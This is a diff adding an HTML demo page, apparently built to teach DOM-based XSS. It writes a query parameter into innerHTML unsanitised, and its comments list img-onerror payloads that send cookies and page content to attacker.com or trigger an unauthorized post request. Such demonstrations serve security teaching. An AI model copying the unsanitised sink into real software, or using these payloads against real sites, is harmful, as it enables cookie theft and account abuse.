@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Hello, World!</h1>
+    <div id="user"></div>
+</body>
+
+<script>
+
+    const setCookies = () => {
+        document.cookie = "dummyCookie=HelloWorld; SameSite=None; Secure";
+    }
+    setCookies();
+</script>
+
+<script>
+    //read name from query params
+    const urlParams = new URLSearchParams(window.location.search);
+    const userName = urlParams.get('name');
+    // Example JavaScript code
+    document.getElementById("user").innerHTML = userName;
+</script>
+
+
+<script>
+    //create post for user
+    const createPost = (title , description) => {
+        // make post request to server with title and description with dummy api
+        fetch('https://jsonplaceholder.typicode.com/posts', {
+            method: 'POST',
+            body: JSON.stringify({
+                title: title,
+                body: description,
+                userId: 1,
+            }),
+            headers: {
+                'Content-type': 'application/json; charset=UTF-8',
+            },
+        })
+    }
+</script>
+
+
+<script>
+
+/**
+ * query param to xss stealing user cookie
+ * name?=<img src="x" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)"/>
+ */
+
+
+/**
+ * query params to perform unauthorized post creation by calling the createPost function
+ * name?=<img src="x" onerror="createPost('Hacked', 'This is a hacked post')"/>
+ */
+
+
+/**
+ * query params to steal user information by sending html content to attacker server
+ * name?=<img src="x" onerror="fetch('https://attacker.com/steal?user=' + document.getElementById('user').innerHTML)"/> 
+ */
+
+
+</script>
+
+</html>
